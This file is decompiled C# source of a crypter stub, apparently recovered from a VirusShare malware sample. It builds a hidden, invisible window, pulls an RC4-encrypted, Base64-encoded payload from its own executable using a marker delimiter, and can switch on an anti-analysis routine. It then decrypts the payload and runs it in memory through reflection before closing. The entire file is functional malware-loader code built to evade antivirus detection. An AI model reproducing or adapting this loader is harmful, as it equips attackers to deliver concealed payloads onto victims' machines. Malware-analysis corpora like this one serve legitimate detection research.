// Decompiled with JetBrains decompiler
// Type: CrypterStub_3.Form1
// Assembly: CrypterStub 3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8724580C-9406-4985-9EC0-E773CDF09143
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Packed.MSIL.MSILPack.a-934a2faafd7eee41f05c2c1e66fb11cb5a30943b3ef59825f84bd9a1fa566e0a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace CrypterStub_3
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.Manual;
      this.ResumeLayout(false);
    }

    private byte[] StringToByteArray(string str) => new ASCIIEncoding().GetBytes(str);

    private void RunFromMemory(byte[] bytes)
    {
      Assembly assembly = Assembly.Load(bytes);
      MethodInfo entryPoint = assembly.EntryPoint;
      object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
      entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1]
      {
        (object) new string[1]{ "1" }
      });
    }

    public static byte[] RC4EnDeCrypt(byte[] plaintxt, byte[] password)
    {
      byte[] numArray = new byte[checked (plaintxt.Length + 1)];
      int[] sbox = new int[257];
      int index1 = 0;
      int index2 = 0;
      Form1.RC4Initialize(password, ref sbox);
      int num1 = checked (plaintxt.Length - 1);
      int index3 = 0;
      while (index3 <= num1)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + sbox[index1]) % 256;
        int num2 = sbox[index1];
        sbox[index1] = sbox[index2];
        sbox[index2] = num2;
        int num3 = sbox[checked (sbox[index1] + sbox[index2]) % 256];
        plaintxt[index3] = (byte) ((int) plaintxt[index3] ^ (int) Convert.ToByte(num3));
        checked { ++index3; }
      }
      return plaintxt;
    }

    protected static void RC4Initialize(byte[] key, ref int[] sbox)
    {
      int length = key.Length;
      int index1 = 0;
      do
      {
        sbox[index1] = index1;
        checked { ++index1; }
      }
      while (index1 <= (int) byte.MaxValue);
      int index2 = 0;
      int index3 = 0;
      do
      {
        index2 = checked (index2 + sbox[index3] + (int) key[unchecked (index3 % length)]) % 256;
        int num = sbox[index3];
        sbox[index3] = sbox[index2];
        sbox[index2] = num;
        checked { ++index3; }
      }
      while (index3 <= (int) byte.MaxValue);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      string Delimiter = "~~||$CyCrYpTeR$||~~";
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read);
      string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref Expression);
      FileSystem.FileClose(1);
      try
      {
        string[] strArray = Strings.Split(Expression, Delimiter);
        string s = strArray[1];
        byte[] bytes = Encoding.ASCII.GetBytes(strArray[2]);
        if (Operators.CompareString(strArray[3], "true", false) == 0)
          Antis.Enable();
        byte[] parameter = Form1.RC4EnDeCrypt(Convert.FromBase64String(s), bytes);
        Thread thread = new Thread((ParameterizedThreadStart) (a0 => this.RunFromMemory((byte[]) a0)));
        thread.TrySetApartmentState(ApartmentState.STA);
        thread.Start((object) parameter);
        this.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
